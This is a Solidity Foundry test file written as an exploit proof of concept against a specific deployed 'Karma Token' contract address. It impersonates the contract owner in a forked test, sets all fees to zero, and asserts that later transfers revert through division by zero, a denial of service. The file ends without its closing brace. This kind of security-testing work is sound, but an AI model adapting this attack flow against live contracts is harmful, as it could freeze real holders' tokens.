pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IKarma {
    function changeFees(uint256 _reflectionFeeBuy, uint256 _marketingFeeBuy, uint256 _teamFeeBuy, uint256 _reflectionFeeSell, uint256 _marketingFeeSell, uint256 _teamFeeSell) external;
    function viewFeesBuy() external view returns (uint256, uint256, uint256, uint256, uint256);
    function viewFeesSell() external view returns (uint256, uint256, uint256, uint256, uint256);
    function enableTrading() external;
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function totalFeeBuy() external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xBC570B260c52A032DE9eF06087e91b2C5104C76B;
    address attacker = address(this);
    IKarma karma;
    address owner;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        karma = IKarma(TARGET);
        owner = address(uint160(uint256(vm.load(TARGET, bytes32(0)))));
        vm.label(owner, "Owner");
        vm.label(TARGET, "Karma Token");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        // Step 1: Impersonate owner and set all fees to 0
        vm.startPrank(owner);
        karma.changeFees(0, 0, 0, 0, 0, 0);
        vm.stopPrank();

        // Step 2: Verify totalFeeBuy is now 0 (oracle check)
        (uint256 mFeeBuy, uint256 tFeeBuy, uint256 rFeeBuy, uint256 totalFee, uint256 denom) = karma.viewFeesBuy();
        assertEq(totalFee, 0, "totalFeeBuy should be 0");

        // Step 3: Demonstrate DoS - transfer will revert due to division by zero
        // First enable trading and give attacker some tokens
        vm.prank(owner);
        karma.enableTrading();

        // Transfer some tokens to attacker to test the DoS
        vm.prank(owner);
        karma.transfer(attacker, 1000 * 1e18);

        // Now attempt a transfer - this should revert with division by zero
        // We catch the revert to prove the DoS exists
        bool success;
        bytes memory data = abi.encodeWithSignature("transfer(address,uint256)", address(0x1234), 100 * 1e18);
        (success, data) = address(karma).call(data);
        assertEq(success, false, "Transfer should revert due to division by zero - DoS confirmed");
        assertEq(totalFee, 0, "Logic Exploit Failed: State not tampered");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
